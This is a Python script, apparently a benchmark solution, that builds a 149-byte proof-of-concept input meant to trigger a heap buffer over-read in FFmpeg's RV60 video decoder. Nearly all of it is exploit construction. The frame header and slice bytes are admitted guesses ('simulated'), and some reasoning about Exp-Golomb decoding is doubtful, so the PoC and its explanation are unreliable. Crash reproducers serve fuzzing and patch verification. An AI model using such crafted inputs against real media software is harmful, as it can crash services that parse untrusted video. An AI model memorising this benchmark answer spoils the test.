import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability in avcodec/rv60dec.
        
        The vulnerability (oss-fuzz:385170375) is due to 'init_get_bits' being initialized 
        with 'buf_size - offset' instead of the actual slice size. This allows the bit reader 
        to read past the slice boundary into the next slice's data. If the data in the next 
        slice forms a malicious sequence (e.g. large Exp-Golomb value) when interpreted as 
        part of the current slice, it causes a crash (Heap Buffer Overflow/OOB Read).
        
        The fixed version correctly limits the bit reader to the slice size, so the malicious 
        read fails gracefully.
        
        Ground-truth PoC length: 149 bytes.
        """
        
        # 1. Construct Extradata (8 bytes)
        # rv60_decode_init requires at least 8 bytes of extradata.
        # We provide standard dimensions (e.g. 352x288) to pass initialization.
        extradata = struct.pack('<II', 352, 288)
        
        # 2. Construct Packet Payload (141 bytes to reach 149 total)
        # We fill the packet with 0x00. In video coding (H.264/RV60), 0x00 bytes 
        # often correspond to Exp-Golomb encoded '0' bits, which decode to very large numbers 
        # if the sequence is long enough (reading until a '1' is found).
        # By providing a buffer of zeros, we force the vulnerable decoder (which has an 
        # incorrect, larger bound) to keep reading into the next slice/buffer end, 
        # decoding a huge integer that causes an OOB access.
        # The fixed decoder will hit the slice boundary check and error out safely.
        
        packet_len = 149 - len(extradata)
        packet = bytearray(packet_len)
        
        # We set specific bytes to simulate a valid frame header and slice structure
        # to ensure the decoder reaches the slice decoding loop.
        
        # Header bytes (simulated)
        # Byte 0: Frame Type / Header info (0x28 is a common starting byte for RealVideo frames)
        packet[0] = 0x28
        
        # Slice Count / Offsets
        # We need the decoder to believe there are multiple slices or at least one slice
        # that it tries to decode. 
        # We inject a few non-zero bytes to act as delimiters or counts.
        packet[5] = 0x02  # Simulate slice count or related parameter
        packet[10] = 0x10 # Simulate an offset
        packet[20] = 0x20 # Simulate another offset
        
        # The rest remains 0x00, acting as the payload that triggers the over-read.
        
        return extradata + packet